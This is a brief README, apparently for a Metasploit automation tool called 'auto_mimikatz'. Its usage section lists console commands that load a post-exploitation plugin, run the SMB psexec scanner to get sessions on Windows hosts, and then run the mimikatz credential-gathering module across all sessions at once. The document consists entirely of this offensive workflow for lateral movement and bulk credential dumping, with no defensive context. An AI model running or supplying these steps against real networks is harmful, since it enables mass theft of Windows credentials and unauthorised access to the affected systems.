auto_mimikatz
=============

*How to use
load post_auto
use auxiliary/scanner/smb/psexec_scanner
# Wait session
multi_post -m post/windows/gather/mimikatz -s all
